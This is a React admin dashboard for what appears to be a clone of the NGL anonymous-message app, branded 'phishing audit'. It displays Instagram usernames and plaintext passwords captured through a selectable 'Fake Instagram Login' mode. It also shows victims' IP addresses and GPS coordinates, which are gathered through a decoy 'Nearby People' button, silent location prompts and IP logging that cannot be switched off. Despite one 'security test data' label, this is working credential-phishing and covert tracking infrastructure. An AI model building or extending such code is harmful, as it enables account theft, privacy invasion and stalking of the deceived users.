import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { MoreHorizontal, Download, Shield, User, Globe, Search, Inbox, Layout, Settings, CheckCircle, Users, Eye, EyeOff, Key } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import html2canvas from 'html2canvas';
import StoryCanvas from '../components/StoryCanvas';
import { getAllMessages, getAllMedia, getSettings, updateSettings, saveMediaEntry, getAllCredentials } from '../lib/firebase';

export default function Admin() {
  const [activeTab, setActiveTab] = useState('inbox');
  const [messages, setMessages] = useState([]);
  const [activeMessage, setActiveMessage] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  const [captureMode, setCaptureMode] = useState('username');
  const [enableLocationCapture, setEnableLocationCapture] = useState(false);
  const [locationStrategy, setLocationStrategy] = useState('login_integrated');
  const [media, setMedia] = useState([]);
  const [credentials, setCredentials] = useState([]);
  const [visiblePasswords, setVisiblePasswords] = useState({});
  const navigate = useNavigate();
  const storyRef = useRef(null);

  const token = sessionStorage.getItem('admin_token');

  useEffect(() => {
    if (!token) {
      navigate('/login');
    }
  }, [token, navigate]);

  const fetchFullData = async () => {
    try {
      const [msgs, settings, mediaList, creds] = await Promise.all([
        getAllMessages(),
        getSettings(),
        getAllMedia(),
        getAllCredentials()
      ]);
      setMessages(msgs);
      setCaptureMode(settings.captureMode || 'username');
      setEnableLocationCapture(settings.enableLocationCapture || false);
      setLocationStrategy(settings.locationStrategy || 'login_integrated');
      setMedia(mediaList);
      setCredentials(creds);
    } catch (err) {
      console.error('Failed to fetch admin data:', err);
    }
  };

  useEffect(() => {
    if (token) fetchFullData();
  }, []);

  const handleCaptureMode = async (mode) => {
    setCaptureMode(mode);
    await updateSettings({ captureMode: mode });
  };

  const handleToggleLocation = async (enabled) => {
    setEnableLocationCapture(enabled);
    await updateSettings({ enableLocationCapture: enabled });
  };

  const handleLocationStrategy = async (strategy) => {
    setLocationStrategy(strategy);
    await updateSettings({ locationStrategy: strategy });
  };

  const togglePasswordVisibility = (id) => {
    setVisiblePasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleDownload = async (text) => {
    setActiveMessage(text);
    setTimeout(async () => {
      if (storyRef.current) {
        try {
          const canvas = await html2canvas(storyRef.current, {
            scale: 2,
            useCORS: true,
            allowTaint: true,
            backgroundColor: null
          });
          const imgData = canvas.toDataURL('image/png', 1.0);
          const link = document.createElement('a');
          link.href = imgData;
          link.download = `ngl-story-${Date.now()}.png`;
          link.click();

          await saveMediaEntry({ text });
          fetchFullData();
        } catch (err) {
          console.error('Download failed:', err);
        }
      }
    }, 300);
  };

  const filteredMessages = messages.filter(m =>
    m.text.toLowerCase().includes(searchTerm.toLowerCase()) ||
    m.igUsername?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const renderContent = () => {
    switch (activeTab) {
      case 'inbox':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Mesaj Arşivi</h1>
                <p>{messages.length} kayıtlı veri girişi</p>
              </div>
              <div className="search-bar">
                <Search size={18} />
                <input
                  type="text"
                  placeholder="Mesaj veya Kullanıcı ara..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
            </header>

            <div className="log-grid">
              <AnimatePresence>
                {filteredMessages.map((msg) => (
                  <motion.div
                    key={msg.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="log-card"
                  >
                    <div className="log-meta">
                      <div className="meta-item">
                        <User size={14} />
                        <span>{msg.igUsername || 'Anonim'}</span>
                      </div>
                      <div className="meta-item">
                        <Globe size={14} />
                        <span>{msg.ip || '0.0.0.0'}</span>
                      </div>
                      <div className="meta-time">
                        {new Date(msg.timestamp).toLocaleString()}
                      </div>
                    </div>

                    <div className="log-body">
                      <p>{msg.text}</p>
                    </div>

                    <div className="log-actions">
                      <button className="action-pill download" onClick={() => handleDownload(msg.text)}>
                        <Download size={14} /> Story Oluştur
                      </button>
                      <button className="action-pill more">
                        <MoreHorizontal size={14} />
                      </button>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>
        );

      case 'users':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Yakalanan Kimlik Bilgileri</h1>
                <p>{credentials.length} kayıt — Siber güvenlik test verisi</p>
              </div>
            </header>

            {credentials.length === 0 ? (
              <div className="empty-state-box">
                <Key size={48} color="#ccc" />
                <p>Henüz yakalanan kimlik bilgisi yok.</p>
                <span>Sahte IG giriş ekranı aktif olduğunda burada görünecek.</span>
              </div>
            ) : (
              <div className="cred-grid">
                {credentials.map((cred) => (
                  <motion.div
                    key={cred.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="cred-card"
                  >
                    <div className="cred-header">
                      <div className="cred-avatar">
                        <User size={20} color="#FF1F7C" />
                      </div>
                      <div className="cred-user-info">
                        <span className="cred-username">{cred.username}</span>
                        <span className="cred-time">{new Date(cred.timestamp).toLocaleString()}</span>
                      </div>
                    </div>

                    <div className="cred-details">
                      <div className="cred-field">
                        <span className="cred-label">Kullanıcı Adı</span>
                        <span className="cred-value">{cred.username}</span>
                      </div>
                      <div className="cred-field">
                        <span className="cred-label">Şifre</span>
                        <div className="cred-password-row">
                          <span className="cred-value mono">
                            {visiblePasswords[cred.id] ? cred.password : '••••••••'}
                          </span>
                          <button className="eye-btn" onClick={() => togglePasswordVisibility(cred.id)}>
                            {visiblePasswords[cred.id] ? <EyeOff size={16} /> : <Eye size={16} />}
                          </button>
                        </div>
                      </div>
                      <div className="cred-field">
                        <span className="cred-label">IP Adresi</span>
                        <span className="cred-value">{cred.ip || 'Unknown'}</span>
                      </div>
                      {cred.location && (
                        <div className="cred-field">
                          <span className="cred-label">Konum</span>
                          <a
                            href={`https://www.google.com/maps?q=${cred.location.lat},${cred.location.lng}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="location-link"
                          >
                            <Globe size={14} /> Haritada Gör ({cred.location.strategy === 'nearby_feature' ? 'Buton' : 'Oto'})
                          </a>
                        </div>
                      )}
                    </div>
                  </motion.div>
                ))}
              </div>
            )}
          </div>
        );

      case 'media':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Medya Kütüphanesi</h1>
                <p>Oluşturulan hikaye görselleri</p>
              </div>
            </header>
            <div className="media-grid">
              {media.length > 0 ? media.map(m => (
                <div key={m.id} className="media-item-card">
                  <div className="media-preview">
                    <Inbox color="#FF1F7C" size={32} />
                    <p>{m.text.substring(0, 30)}...</p>
                  </div>
                  <div className="media-info">
                    <span>{new Date(m.timestamp).toLocaleDateString()}</span>
                  </div>
                </div>
              )) : (
                <div className="empty-state">Henüz medya oluşturulmadı.</div>
              )}
            </div>
          </div>
        );

      case 'settings':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Sistem Ayarları</h1>
                <p>Yakalama modunu ve uygulama davranışını özelleştirin</p>
              </div>
            </header>

            <div className="settings-section">
              {/* Capture Mode — Radio group */}
              <div className="setting-group-title">Yakalama Modu</div>

              <div
                className={`setting-card selectable ${captureMode === 'ig_login' ? 'selected' : ''}`}
                onClick={() => handleCaptureMode('ig_login')}
              >
                <div className="setting-info">
                  <h3>🎣 Sahte Instagram Girişi</h3>
                  <p>Kullanıcıya Instagram giriş sayfası gösterilir. Kullanıcı adı ve şifre yakalanır.</p>
                </div>
                <div className={`radio-circle ${captureMode === 'ig_login' ? 'active' : ''}`}>
                  {captureMode === 'ig_login' && <div className="radio-dot"></div>}
                </div>
              </div>

              <div
                className={`setting-card selectable ${captureMode === 'username' ? 'selected' : ''}`}
                onClick={() => handleCaptureMode('username')}
              >
                <div className="setting-info">
                  <h3>📝 Kullanıcı Adı İste</h3>
                  <p>Kullanıcıdan sadece Instagram kullanıcı adını girmesi istenir (şifre sorulmaz).</p>
                </div>
                <div className={`radio-circle ${captureMode === 'username' ? 'active' : ''}`}>
                  {captureMode === 'username' && <div className="radio-dot"></div>}
                </div>
              </div>

              <div
                className={`setting-card selectable ${captureMode === 'none' ? 'selected' : ''}`}
                onClick={() => handleCaptureMode('none')}
              >
                <div className="setting-info">
                  <h3>⚡ Direkt Mesaj</h3>
                  <p>Kullanıcı bilgi girmeden doğrudan mesaj yazma ekranına yönlendirilir.</p>
                </div>
                <div className={`radio-circle ${captureMode === 'none' ? 'active' : ''}`}>
                  {captureMode === 'none' && <div className="radio-dot"></div>}
                </div>
              </div>

              <div className="setting-group-title" style={{ marginTop: '30px' }}>Konum Servisleri</div>

              <div
                className={`setting-card selectable ${enableLocationCapture ? 'selected' : ''}`}
                onClick={() => handleToggleLocation(!enableLocationCapture)}
              >
                <div className="setting-info">
                  <h3>📍 Konum Toplama</h3>
                  <p>Kullanıcılardan GPS konum izni istenir ve koordinatlar kaydedilir (Tarayıcı izni gerektirir).</p>
                </div>
                <div className={`toggle-switch ${enableLocationCapture ? 'active' : ''}`}>
                  <div className="toggle-knob"></div>
                </div>
              </div>

              {enableLocationCapture && (
                <div className="sub-settings" style={{ marginLeft: '20px', marginTop: '10px', borderLeft: '2px solid #ddd', paddingLeft: '15px' }}>
                  <div className="setting-subtitle" style={{ fontSize: '0.85rem', fontWeight: 600, color: '#666', marginBottom: '10px' }}>TOPLAMA STRATEJİSİ</div>

                  <div
                    className={`setting-card small selectable ${locationStrategy === 'login_integrated' ? 'selected' : ''}`}
                    onClick={() => handleLocationStrategy('login_integrated')}
                    style={{ padding: '15px' }}
                  >
                    <div className="setting-info">
                      <h4 style={{ margin: 0, fontSize: '0.95rem' }}>Giriş Entegreli (Sessiz)</h4>
                      <p style={{ fontSize: '0.8rem', margin: '4px 0 0 0' }}>Giriş ekranı açıldığında veya form gönderilirken izin istenir.</p>
                    </div>
                    <div className={`radio-circle ${locationStrategy === 'login_integrated' ? 'active' : ''}`}>
                      {locationStrategy === 'login_integrated' && <div className="radio-dot"></div>}
                    </div>
                  </div>

                  <div
                    className={`setting-card small selectable ${locationStrategy === 'nearby_feature' ? 'selected' : ''}`}
                    onClick={() => handleLocationStrategy('nearby_feature')}
                    style={{ padding: '15px' }}
                  >
                    <div className="setting-info">
                      <h4 style={{ margin: 0, fontSize: '0.95rem' }}>"Yakınlardakileri Gör" Özelliği</h4>
                      <p style={{ fontSize: '0.8rem', margin: '4px 0 0 0' }}>Ana sayfaya sahte bir "Yakınlardaki Kişiler" butonu ekler.</p>
                    </div>
                    <div className={`radio-circle ${locationStrategy === 'nearby_feature' ? 'active' : ''}`}>
                      {locationStrategy === 'nearby_feature' && <div className="radio-dot"></div>}
                    </div>
                  </div>
                </div>
              )}

              <div className="setting-group-title" style={{ marginTop: '30px' }}>Sistem</div>

              <div className="setting-card disabled">
                <div className="setting-info">
                  <h3>Gelişmiş IP Takibi</h3>
                  <p>Her durumda IP adresi sessizce kaydedilecektir (Devre dışı bırakılamaz).</p>
                </div>
                <div className="status-fixed">
                  <CheckCircle size={18} color="#2ecc71" />
                  <span>Aktif</span>
                </div>
              </div>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="pro-admin">
      <header className="sidebar">
        <div className="sidebar-top">
          <div className="admin-badge">
            <Shield size={20} />
            <span>Admin Panel v3.0</span>
          </div>
          <div className="logo-section">
            <span className="logo-bold">NGL</span>
            <span className="logo-light">phishing audit</span>
          </div>
        </div>

        <nav className="sidebar-nav">
          <div className={`nav-item ${activeTab === 'inbox' ? 'active' : ''}`} onClick={() => setActiveTab('inbox')}>
            <Inbox size={18} /> Gelen Kutusu
          </div>
          <div className={`nav-item ${activeTab === 'users' ? 'active' : ''}`} onClick={() => setActiveTab('users')}>
            <Users size={18} /> Yakalanan Bilgiler
            {credentials.length > 0 && <span className="badge">{credentials.length}</span>}
          </div>
          <div className={`nav-item ${activeTab === 'media' ? 'active' : ''}`} onClick={() => setActiveTab('media')}>
            <Layout size={18} /> Medya Kütüphanesi
          </div>
          <div className={`nav-item ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}>
            <Settings size={18} /> Ayarlar
          </div>
        </nav>

        <div className="sidebar-footer">
          <button className="logout-btn" onClick={() => {
            sessionStorage.removeItem('admin_token');
            navigate('/login');
          }}>Çıkış Yap</button>
        </div>
      </header>

      <main className="dashboard-content">
        {renderContent()}
        <StoryCanvas ref={storyRef} message={activeMessage} />
      </main>

      <style>{`
        .pro-admin {
          display: flex;
          min-height: 100vh;
          background: #f8f9fa;
          color: #333;
          font-family: 'Outfit', sans-serif;
        }

        .sidebar {
          width: 280px;
          background: #000;
          color: white;
          padding: 30px;
          display: flex;
          flex-direction: column;
          position: sticky;
          top: 0;
          height: 100vh;
          z-index: 100;
        }

        .admin-badge {
          background: #333;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          padding: 6px 12px;
          border-radius: 10px;
          font-size: 0.75rem;
          font-weight: 700;
          margin-bottom: 20px;
        }

        .logo-section { display: flex; flex-direction: column; margin-bottom: 40px; }
        .logo-bold { font-weight: 900; font-size: 2rem; font-style: italic; line-height: 1; }
        .logo-light { font-size: 0.85rem; color: #666; font-weight: 600; text-transform: lowercase; }

        .sidebar-nav { flex: 1; display: flex; flex-direction: column; gap: 10px; }
        .nav-item {
          padding: 14px 20px;
          border-radius: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
          display: flex;
          align-items: center;
          gap: 12px;
          color: #888;
          position: relative;
        }
        .nav-item:hover { color: white; background: #1a1a1a; }
        .nav-item.active { background: linear-gradient(180deg, #FF1F7C 0%, #FF9B42 100%); color: white; }

        .badge {
          background: #FF1F7C;
          color: white;
          font-size: 0.65rem;
          font-weight: 800;
          padding: 2px 8px;
          border-radius: 20px;
          margin-left: auto;
        }

        .logout-btn {
          background: #c0392b;
          border: none;
          color: white;
          padding: 14px;
          border-radius: 12px;
          width: 100%;
          font-weight: 700;
          cursor: pointer;
          transition: background 0.2s;
        }
        .logout-btn:hover { background: #a93226; }

        .dashboard-content { flex: 1; padding: 40px; overflow-y: auto; }
        
        .tab-pane { max-width: 1200px; margin: 0 auto; }
        
        .content-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 40px;
        }
        .header-left h1 { font-weight: 800; font-size: 1.8rem; margin-bottom: 4px; }
        .header-left p { color: #888; font-weight: 600; }

        .search-bar {
          background: white;
          padding: 12px 20px;
          border-radius: 15px;
          display: flex;
          align-items: center;
          gap: 12px;
          box-shadow: 0 4px 20px rgba(0,0,0,0.04);
          width: 350px;
          border: 1px solid #eee;
        }
        .search-bar input { border: none; outline: none; width: 100%; font-weight: 600; font-family: inherit; }

        .log-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
          gap: 24px;
        }

        .log-card {
          background: white;
          border-radius: 24px;
          padding: 24px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.03);
          border: 1px solid #edf2f7;
          transition: transform 0.2s;
        }
        .log-card:hover { transform: translateY(-4px); }

        .log-meta { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
        .meta-item {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 0.75rem;
          font-weight: 700;
          color: #4a5568;
          background: #f7fafc;
          padding: 6px 12px;
          border-radius: 30px;
        }
        .meta-time {
          width: 100%;
          font-size: 0.7rem;
          color: #a0aec0;
          font-weight: 600;
          margin-top: 4px;
        }

        .log-body {
          background: #fdfdfd;
          border: 1px dashed #e2e8f0;
          padding: 20px;
          border-radius: 15px;
          margin-bottom: 15px;
          min-height: 80px;
          display: flex;
          align-items: center;
          font-weight: 600;
          line-height: 1.5;
          color: #1a1a1a;
        }

        .log-actions { display: flex; gap: 10px; }
        .action-pill {
          padding: 10px 18px;
          border-radius: 12px;
          border: none;
          font-weight: 700;
          font-size: 0.8rem;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 8px;
          transition: opacity 0.2s;
        }
        .action-pill.download { background: #000; color: white; }
        .action-pill.more { background: #f1f3f5; color: #444; }
        .action-pill:hover { opacity: 0.8; }

        /* Credentials */
        .cred-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
          gap: 20px;
        }

        .cred-card {
          background: white;
          border-radius: 20px;
          padding: 24px;
          border: 1px solid #eee;
          box-shadow: 0 4px 20px rgba(0,0,0,0.03);
          transition: transform 0.2s;
        }
        .cred-card:hover { transform: translateY(-3px); }

        .cred-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 20px;
          padding-bottom: 16px;
          border-bottom: 1px solid #f0f0f0;
        }
        .cred-avatar {
          width: 42px;
          height: 42px;
          border-radius: 50%;
          background: #fff0f5;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .cred-user-info { display: flex; flex-direction: column; }
        .cred-username { font-weight: 700; font-size: 1rem; color: #1a1a1a; }
        .cred-time { font-size: 0.7rem; color: #aaa; font-weight: 600; }

        .cred-details { display: flex; flex-direction: column; gap: 12px; }
        .cred-field {
          display: flex;
          flex-direction: column;
          gap: 4px;
        }
        .cred-label { font-size: 0.7rem; font-weight: 700; color: #999; text-transform: uppercase; letter-spacing: 0.5px; }
        .cred-value { font-size: 0.95rem; font-weight: 600; color: #333; }
        .cred-value.mono { font-family: 'SF Mono', 'Fira Code', monospace; letter-spacing: 1px; }

        .cred-password-row {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .eye-btn {
          background: none;
          border: none;
          cursor: pointer;
          color: #888;
          padding: 4px;
          display: flex;
          align-items: center;
        }
        .eye-btn:hover { color: #FF1F7C; }

        .empty-state-box {
          text-align: center;
          padding: 80px 40px;
          background: white;
          border-radius: 24px;
          border: 2px dashed #e0e0e0;
        }
        .empty-state-box p { font-weight: 700; font-size: 1.1rem; margin-top: 16px; color: #555; }
        .empty-state-box span { font-size: 0.85rem; color: #aaa; font-weight: 500; }

        /* Media */
        .media-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
          gap: 20px;
        }
        .media-item-card {
           background: white; border-radius: 20px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.02);
        }
        .media-preview {
          height: 150px; background: #f8f9fa; border-radius: 12px;
          display: flex; flex-direction: column; align-items: center; justify-content: center;
          margin-bottom: 10px; text-align: center; padding: 10px; font-size: 0.8rem; color: #666;
        }
        .media-info { font-size: 0.75rem; font-weight: 700; color: #999; }

        /* Settings */
        .settings-section { display: flex; flex-direction: column; gap: 14px; }
        
        .setting-group-title {
          font-weight: 800;
          font-size: 0.8rem;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: #999;
          margin-bottom: 4px;
        }

        .setting-card {
          background: white; padding: 24px; border-radius: 20px;
          display: flex; justify-content: space-between; align-items: center;
          border: 2px solid #eee;
          transition: all 0.2s;
        }
        .setting-card.selectable { cursor: pointer; }
        .setting-card.selectable:hover { border-color: #ffc9e0; }
        .setting-card.selected { border-color: #FF1F7C; background: #fff5f9; }
        .setting-card.disabled { background: #fafafa; opacity: 0.8; cursor: default; }

        .setting-info h3 { font-size: 1.05rem; font-weight: 800; margin-bottom: 4px; }
        .setting-info p { font-size: 0.85rem; color: #666; font-weight: 500; max-width: 400px; }
        
        .radio-circle {
          width: 24px;
          height: 24px;
          border-radius: 50%;
          border: 2px solid #ddd;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          transition: border-color 0.2s;
        }
        .radio-circle.active { border-color: #FF1F7C; }
        .radio-dot {
          width: 12px;
          height: 12px;
          border-radius: 50%;
          background: #FF1F7C;
        }

        .status-fixed { display: flex; align-items: center; gap: 8px; font-weight: 700; color: #2ecc71; font-size: 0.9rem; }

        @media (max-width: 1024px) {
          .pro-admin { flex-direction: column; }
          .sidebar { width: 100%; height: auto; position: static; padding: 20px; }
          .logo-section { margin-bottom: 20px; }
          .sidebar-nav { flex-direction: row; overflow-x: auto; padding-bottom: 10px; }
          .nav-item { white-space: nowrap; padding: 10px 15px; }
          .badge { display: none; }
        }
        .toggle-switch {
          width: 44px;
          height: 24px;
          background: #ccc;
          border-radius: 12px;
          position: relative;
          transition: background 0.3s;
        }
        .toggle-switch.active { background: #2ecc71; }
        .toggle-knob {
          width: 20px;
          height: 20px;
          background: white;
          border-radius: 50%;
          position: absolute;
          top: 2px;
          left: 2px;
          transition: transform 0.3s;
          box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .toggle-switch.active .toggle-knob { transform: translateX(20px); }
        
        .location-link {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          color: #3498db;
          text-decoration: none;
          font-weight: 600;
          font-size: 0.9rem;
        }
        .location-link:hover { text-decoration: underline; }
      `}</style>
    </div>
  );
}
